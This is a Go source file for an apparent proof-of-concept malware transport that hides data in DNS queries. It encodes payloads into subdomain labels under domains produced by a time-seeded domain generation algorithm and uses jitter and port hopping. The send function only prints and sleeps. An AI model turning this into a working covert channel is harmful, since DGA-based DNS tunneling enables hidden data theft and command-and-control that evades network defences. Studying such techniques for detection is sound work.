package transport

import (
	"encoding/base64"
	"fmt"
	"strings"
	"33lr-framework/pkg/dga"
	"time"
)

// DNSTunnel represents the 33LR DNS Tunneling transport.
type DNSTunnel struct {
	BaseSeed string
	TLD      string
	LFSR     *LFSR
}

// NewDNSTunnel creates a new tunnel instance.
func NewDNSTunnel(seed, tld string) *DNSTunnel {
	return &DNSTunnel{
		BaseSeed: seed,
		TLD:      tld,
		LFSR:     NewLFSR(0),
	}
}

// EncodePayload encodes binary data into a 33LR-compliant string.
// Note: In a full implementation, this would use Base32768 (Unicode Private Area).
// For this POC, we use URL-safe Base64 as a high-density alternative for subdomains.
func (d *DNSTunnel) EncodePayload(data []byte) string {
	return base64.RawURLEncoding.EncodeToString(data)
}

// PrepareQuery generates a DNS query string (e.g., <payload>.<dga-domain>)
func (d *DNSTunnel) PrepareQuery(payload []byte) string {
	encoded := d.EncodePayload(payload)
	dgaDomain := dga.GenerateDomain(d.BaseSeed, time.Now(), d.TLD)
	
	// Split payload into subdomains if too long (max 63 chars per label)
	var labels []string
	for i := 0; i < len(encoded); i += 60 {
		end := i + 60
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, encoded[i:end])
	}
	
	return fmt.Sprintf("%s.%s", strings.Join(labels, "."), dgaDomain)
}

// SendSimulatedPacket simulates sending a packet with adaptive frequency hopping.
func (d *DNSTunnel) SendSimulatedPacket(payload []byte) {
	query := d.PrepareQuery(payload)
	jitter := d.LFSR.GetJitterInterval(1, 120)
	port := d.LFSR.GetNextPort([]int{53, 443, 8080})

	fmt.Printf("[TRANSPORT] Query: %s\n", query)
	fmt.Printf("[TRANSPORT] Port: UDP/%d | Delay: %v\n", port, jitter)
	
	// Simulate the wait
	time.Sleep(jitter)
}
